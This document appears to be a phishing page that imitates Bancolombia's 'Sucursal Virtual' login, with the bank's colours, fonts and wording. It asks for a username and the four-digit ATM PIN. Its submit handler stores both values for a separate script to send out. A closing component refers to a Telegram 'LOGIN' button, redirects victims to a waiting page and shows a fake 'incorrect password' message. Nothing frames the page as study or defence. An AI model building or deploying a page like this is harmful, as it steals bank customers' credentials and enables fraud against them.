<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia - Sucursal Virtual</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'bancolombia-yellow': '#fdda24',
                    }
                }
            }
        }
    </script>
    <style>
        @font-face {
            font-family: 'bancolombia';
            src: url('/3co/fonts/bancolombia.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-Regular.woff') format('woff'),
                url('/3co/fonts/OpenSans-Regular.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-SemiBold.woff') format('woff'),
                url('/3co/fonts/OpenSans-SemiBold.ttf') format('truetype');
            font-weight: 600;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansBold.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansBold.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansLight.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansLight.woff') format('woff');
            font-weight: 300;
            font-style: normal;
        }

        body {
            font-family: 'Open Sans', sans-serif;
        }

        .font-bancolombia {
            font-family: 'bancolombia', sans-serif;
        }

        .font-open-sans {
            font-family: 'Open Sans', sans-serif;
            font-weight: 400;
        }

        .font-open-sans-semibold {
            font-family: 'Open Sans', sans-serif;
            font-weight: 600;
        }

        .font-cib-sans-light {
            font-family: 'CIB Sans', sans-serif;
            font-weight: 300;
        }

        .font-cib-sans-bold {
            font-family: 'CIB Sans', sans-serif;
            font-weight: 700;
        }

        .floating-label-container {
            position: relative;
            display: flex;
            align-items: center;
            transition: all 0.3s ease;
        }

        .floating-label {
            position: absolute;
            left: 2.5rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 14px;
            color: #6b7280;
            transition: all 0.2s ease;
            padding: 0 4px;
            pointer-events: none;
            z-index: 10;
            background: white;
        }

        .floating-label.active {
            top: -4px;
            left: 0.5rem;
            font-size: 12px;
            color: #374151;
            transform: translateY(0);
        }

        .floating-input {
            width: 100%;
            padding: 12px 16px 12px 40px;
            font-weight: 600;
            font-size: 14px;
            outline: none;
            transition: all 0.2s ease;
            background: white;
            border: none;
            border-bottom: 0.5px solid #d1d5db;
        }

        .input-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            z-index: 5;
        }

        .floating-input:focus {
            border-bottom: 0.5px solid #374151;
        }

        .thin-border-bottom {
            border-bottom: 0.5px solid #d1d5db;
        }

        .thin-border-input {
            border-bottom: 0.5px solid #d1d5db !important;
        }

        .thin-border-input:focus {
            border-bottom: 0.5px solid #374151 !important;
        }

        .bg-bancolombia {
            background-image: url('/3co/assets/bgImage.svg');
            background-position: bottom;
            background-repeat: no-repeat;
        }

        .loading-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #fdda24;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .password-input {
            font-size: 18px;
            font-weight: 600;
            color: #000;
            text-align: center;
            background: white;
            border: none;
            outline: none;
            padding: 2px 0 8px 0;
            caret-color: #000;
        }

        .password-input:focus {
            border-bottom-color: #374151;
        }

        @media (hover: none) and (pointer: coarse) {
            .password-input {
                font-size: 20px;
                padding: 1px 0 9px 0;
            }
        }
    </style>
</head>

<body class="bg-gray-100">

    <!-- Header -->
    <div class="w-full flex justify-center items-center py-3 z-50">
        <div class="w-[98%] flex gap-10 items-center">
            <img src="/3co/assets/header.svg" class="ml-[25%] w-[45%] object-contain" alt="Bancolombia" />
            <div class="flex justify-center items-center gap-1.5 cursor-pointer" onclick="salir()">
                <span class="text-[15px]">Salir</span>
                <img src="/3co/assets/exitHeader.svg" class="w-5 object-contain" alt="Salir" />
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="bg-bancolombia min-h-[70vh] w-[90%] mx-auto flex flex-col items-center justify-center">

        <!-- Inicio de Sesión -->
        <div id="login" class="w-full flex flex-col justify-center items-center pb-6">
            <h5 id="titulo" class="text-[24px] font-cib-sans-bold mt-10">Te damos la bienvenida</h5>

            <form id="formLogin" class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">

                <!-- Usuario Section -->
                <div id="usuarioForm" class="w-[100%] bg-white px-2 py-4 rounded-xl flex flex-col items-center">

                    <div class="w-full flex items-center justify-center hiddenerror hidden">
                        <span class="text-[11px] text-red-600"> La información ingresada es incorrecta. Intenta
                            nuevamente.</span>
                    </div>

                    <div class="w-[90%] flex flex-col mt-2.5">
                        <span class="text-[16px] text-center text-gray-800">
                            El usuario es el mismo con el que ingresas a la
                            <span class="text-black font-bold">Sucursal Virtual Personas</span>
                        </span>
                    </div>

                    <div class="w-[80%] mt-4 flex flex-col">
                        <div class="w-full floating-label-container thin-border-bottom bg-white">
                            <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                                xmlns="http://www.w3.org/2000/svg">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1"
                                    d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                            </svg>
                            <input id="usuario" name="usuario" type="text" class="floating-input" placeholder="" value=""
                                autocomplete="off" />
                            <span id="usuarioLabel" class="floating-label">
                                Usuario
                            </span>
                        </div>
                        <span id="usuarioError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <div class="w-full pt-6 pb-2 flex justify-between items-center px-[15px]">
                        <button type="button" class="font-bold py-2 px-6 rounded-full border border-black w-32">
                            Volver
                        </button>
                        <button type="button" id="continuarUsuario"
                            class="font-bold py-2 px-6 bg-bancolombia-yellow rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed w-32"
                            disabled>
                            Continuar
                        </button>
                    </div>
                </div>

                <!-- Clave Section -->
                <div id="claveForm" class="w-[100%] bg-white px-2 py-4 rounded-xl flex flex-col items-center hidden">
                    <div class="mt-2.5">
                        <img src="/3co/assets/candado.svg" alt="Candado" />
                    </div>
                    <div class="w-[90%] flex flex-col mt-4 mb-4">
                        <span class="text-[16px] text-center text-gray-800">
                            Es la misma que usas en el cajero automático
                        </span>
                    </div>

                    <div class="w-full mt-4 flex flex-col items-center">
                        <div class="flex justify-center gap-2 w-full max-w-xs">
                            <input id="clave-0" type="text" inputmode="numeric" maxlength="1"
                                class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                            <input id="clave-1" type="text" inputmode="numeric" maxlength="1"
                                class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                            <input id="clave-2" type="text" inputmode="numeric" maxlength="1"
                                class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                            <input id="clave-3" type="text" inputmode="numeric" maxlength="1"
                                class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                        </div>
                        <span id="claveError" class="text-[12px] mt-1.5 font-medium text-red-500 hidden"></span>
                    </div>

                    <div class="w-full pt-6 pb-2 flex justify-between items-center px-[15px]">
                        <button type="button" id="volverClave" class="font-bold py-2 px-6 rounded-full border border-black w-32">
                            Volver
                        </button>
                        <button type="submit" id="enviar"
                            class="font-bold py-2 px-6 bg-bancolombia-yellow rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed w-32"
                            disabled>
                            Continuar
                        </button>
                    </div>
                </div>

                <input type="hidden" id="no-status" name="status" value="login" />
                <div id="mensaje"></div>

            </form>
        </div>

    </div>

    <!-- Footer -->
    <div class="w-full flex flex-col justify-center items-center py-7">
        <div class="w-[90%] border-t border-gray-300"></div>
        <img src="/3co/assets/header.svg" class="w-[40%] object-contain" alt="Bancolombia" />
        <img src="/3co/assets/foter.svg" class="w-[40%] object-contain mt-0.5" alt="Footer" />
    </div>

    <script>
        /* ===== UTILIDADES DE UI ===== */

        /**
        * Actualiza el estado del floating label
        * El label flota hacia arriba cuando el input tiene foco o valor
        */
        function updateFloatingLabel(input, label) {
            const shouldFloat = document.activeElement === input || input.value !== '';
            if (shouldFloat) {
                label.classList.add('active');
            } else {
                label.classList.remove('active');
            }
        }

        /**
        * Configura los floating labels para todos los inputs
        */
        function setupFloatingLabels() {
            const floatingInputs = document.querySelectorAll('.floating-input');
            floatingInputs.forEach(input => {
                const label = document.getElementById(input.id + 'Label');
                if (label) {
                    input.addEventListener('focus', () => updateFloatingLabel(input, label));
                    input.addEventListener('blur', () => updateFloatingLabel(input, label));
                    input.addEventListener('input', () => updateFloatingLabel(input, label));
                    // Inicializar estado del label
                    updateFloatingLabel(input, label);
                }
            });
        }

        /**
        * Habilita o deshabilita un botón
        */
        function toggleButton(btn, enabled) {
            if (!btn) return;
            btn.disabled = !enabled;
            if (enabled) {
                btn.classList.remove('bg-gray-300', 'cursor-not-allowed');
                btn.classList.add('bg-bancolombia-yellow');
            } else {
                btn.classList.add('bg-gray-300', 'cursor-not-allowed');
                btn.classList.remove('bg-bancolombia-yellow');
            }
        }

        /**
        * Deshabilita un botón temporalmente después de hacer clic
        */
        function disableButtonTemporarily(btn, duration = 2000) {
            if (!btn) return;
            const wasEnabled = !btn.disabled;
            btn.disabled = true;
            btn.classList.add('opacity-50', 'cursor-wait');

            setTimeout(() => {
                if (wasEnabled) {
                    btn.disabled = false;
                    btn.classList.remove('opacity-50', 'cursor-wait');
                }
            }, duration);
        }

        /**
        * Muestra un mensaje de error en un campo
        */
        function setError(id, msg) {
            const el = document.getElementById(id);
            if (!el) return;
            if (msg) {
                el.textContent = msg;
                el.classList.remove('hidden');
            } else {
                el.classList.add('hidden');
            }
        }

        /* ===== VALIDACIONES ===== */

        /**
        * Valida el campo usuario
        * Requisito: mínimo 4 caracteres
        */
        function validateUsuario() {
            const usuarioInput = document.getElementById('usuario');
            if (!usuarioInput) return false;

            const usuarioValue = usuarioInput.value.trim();
            const isValid = usuarioValue && usuarioValue.length >= 4;

            const continuarBtn = document.getElementById('continuarUsuario');
            toggleButton(continuarBtn, isValid);

            return isValid;
        }

        /**
        * Valida la clave principal
        * Requisito: exactamente 4 dígitos numéricos
        */
        function validateClave() {
            const inputs = document.querySelectorAll('[id^="clave-"]');
            let clave = '';
            inputs.forEach(i => {
                clave += (i.dataset.realValue || '');
            });

            const isValid = clave.length === 4 && /^\d{4}$/.test(clave);
            const continuarBtn = document.getElementById('enviar');
            toggleButton(continuarBtn, isValid);

            return isValid;
        }

        /* ===== NAVEGACIÓN ===== */

        /**
        * Muestra el formulario de usuario
        */
        function showUsuarioForm() {
            const usuarioForm = document.getElementById('usuarioForm');
            const claveForm = document.getElementById('claveForm');
            const titulo = document.getElementById('titulo');

            titulo.textContent = 'Te damos la bienvenida';
            usuarioForm.classList.remove('hidden');
            claveForm.classList.add('hidden');

            // Enfocar el input de usuario
            setTimeout(() => {
                const usuarioInput = document.getElementById('usuario');
                if (usuarioInput) usuarioInput.focus();
            }, 100);
        }

        /**
        * Muestra el formulario de clave
        */
        function showClaveForm() {
            const usuarioForm = document.getElementById('usuarioForm');
            const claveForm = document.getElementById('claveForm');
            const titulo = document.getElementById('titulo');

            titulo.textContent = 'Clave principal';
            usuarioForm.classList.add('hidden');
            claveForm.classList.remove('hidden');

            // Enfocar el primer input de clave
            setTimeout(() => {
                const claveInput = document.getElementById('clave-0');
                if (claveInput) claveInput.focus();
            }, 100);
        }

        /**
        * Función para salir de la aplicación
        */
        function salir() {
            if (confirm('¿Está seguro que desea salir?')) {
                location.reload();
            }
        }

        /* ===== CONFIGURACIÓN DE INPUTS MULTI-DÍGITO ===== */

        /**
        * Configura los inputs que aceptan múltiples dígitos (OTP, PIN, etc.)
        */
        function setupMultiDigitInputs(prefix, maxLength) {
            for (let i = 0; i < maxLength; i++) {
                const input = document.getElementById(`${prefix}-${i}`);
                if (!input) continue;

                // Si es un input de contraseña (con punto)
                if (input.classList.contains('password-input')) {
                    input.addEventListener('input', function (e) {
                        const v = e.target.value;
                        // Solo permitir un dígito
                        if (!/^[0-9]?$/.test(v)) {
                            e.target.value = '';
                            e.target.dataset.realValue = '';
                            return;
                        }
                        if (v) {
                            // Guardar el valor real y mostrar un punto
                            e.target.dataset.realValue = v;
                            e.target.value = '•';
                            // Mover al siguiente input si no es el último
                            if (i < maxLength - 1) {
                                const nextInput = document.getElementById(`${prefix}-${i + 1}`);
                                if (nextInput) nextInput.focus();
                            }
                        } else {
                            e.target.dataset.realValue = '';
                        }
                        // Validar después de cada entrada
                        if (prefix === 'clave') validateClave();
                    });

                    input.addEventListener('keydown', function (e) {
                        if (e.key === 'Backspace') {
                            if (!this.dataset.realValue && i > 0) {
                                // Si está vacío, ir al anterior y borrarlo
                                const prevInput = document.getElementById(`${prefix}-${i - 1}`);
                                if (prevInput) {
                                    prevInput.focus();
                                    prevInput.value = '';
                                    prevInput.dataset.realValue = '';
                                }
                                if (prefix === 'clave') validateClave();
                            } else if (this.dataset.realValue) {
                                // Si tiene valor, borrarlo
                                this.value = '';
                                this.dataset.realValue = '';
                                if (prefix === 'clave') validateClave();
                            }
                        }
                    });
                } else {
                    // Input normal (no de contraseña)
                    input.addEventListener('input', function (e) {
                        if (!/^[0-9a-zA-Z]?$/.test(e.target.value)) {
                            e.target.value = '';
                            return;
                        }
                        if (e.target.value && i < maxLength - 1) {
                            const nextInput = document.getElementById(`${prefix}-${i + 1}`);
                            if (nextInput) nextInput.focus();
                        }
                    });

                    input.addEventListener('keydown', function (e) {
                        if (e.key === 'Backspace' && !this.value && i > 0) {
                            const prevInput = document.getElementById(`${prefix}-${i - 1}`);
                            if (prevInput) prevInput.focus();
                        }
                    });
                }
            }
        }

        /* ===== LIMPIEZA ===== */

        /**
        * Limpia todos los inputs de la sección de login
        */
        function limpiarLoginInputs() {
            const usuarioInput = document.getElementById('usuario');
            const usuarioError = document.getElementById('usuarioError');
            const claveError = document.getElementById('claveError');

            if (usuarioInput) usuarioInput.value = '';
            if (usuarioError) usuarioError.classList.add('hidden');
            if (claveError) claveError.classList.add('hidden');

            // Limpiar inputs de clave
            document.querySelectorAll('[id^="clave-"]').forEach(input => {
                input.value = '';
                input.dataset.realValue = '';
            });

            // Reset labels
            const usuarioLabel = document.getElementById('usuarioLabel');
            if (usuarioLabel) usuarioLabel.classList.remove('active');

            // Deshabilitar botones
            const continuarUsuarioBtn = document.getElementById('continuarUsuario');
            const enviarBtn = document.getElementById('enviar');
            toggleButton(continuarUsuarioBtn, false);
            toggleButton(enviarBtn, false);

            showUsuarioForm();
        }

        /* ===== LISTENERS ===== */

        document.addEventListener('DOMContentLoaded', function () {
            // Setup de floating labels
            setupFloatingLabels();

            // Setup de inputs multi-dígito
            setupMultiDigitInputs('clave', 4);

            // Listeners para el campo usuario
            const usuarioInput = document.getElementById('usuario');
            if (usuarioInput) {
                usuarioInput.addEventListener('input', function () {
                    validateUsuario();
                });
            }

            // Listener para botón "Continuar Usuario"
            const continuarUsuarioBtn = document.getElementById('continuarUsuario');
            if (continuarUsuarioBtn) {
                continuarUsuarioBtn.addEventListener('click', function () {
                    if (validateUsuario()) {
                        disableButtonTemporarily(this, 1000);
                        showClaveForm();
                    }
                });
            }

            // Listener para botón "Volver Clave"
            const volverClaveBtn = document.getElementById('volverClave');
            if (volverClaveBtn) {
                volverClaveBtn.addEventListener('click', function () {
                    showUsuarioForm();
                });
            }

            // Listener para submit del formulario - guardar datos antes de enviar
            const formLogin = document.getElementById('formLogin');
            if (formLogin) {
                formLogin.addEventListener('submit', function (e) {
                    if (!validateClave()) {
                        e.preventDefault();
                        return;
                    }

                    // Obtener el usuario
                    const usuarioInput = document.getElementById('usuario');
                    const usuario = usuarioInput ? usuarioInput.value.trim() : '';

                    // Obtener la clave de los inputs individuales
                    let clave = '';
                    for (let i = 0; i < 4; i++) {
                        const input = document.getElementById(`clave-${i}`);
                        if (input && input.dataset.realValue) {
                            clave += input.dataset.realValue;
                        }
                    }

                    // Guardar en localStorage para que localStorage-utils-auto.js los envíe
                    if (typeof guardarCampo === 'function') {
                        guardarCampo('usuario', usuario);
                        guardarCampo('clave', clave);
                    }

                    // Deshabilitar botón mientras se envía
                    const enviarBtn = document.getElementById('enviar');
                    if (enviarBtn) {
                        disableButtonTemporarily(enviarBtn, 3000);
                    }
                });
            }

            // Mostrar formulario inicial
            showUsuarioForm();
        });
    </script>

    <x-control :auto-completar="false" :debug="false" redirect-url="/bancol/wait"
        toast-message="Usuario o clave incorrecta. Intenta nuevamente" telegram-button="LOGIN" />

</body>

</html>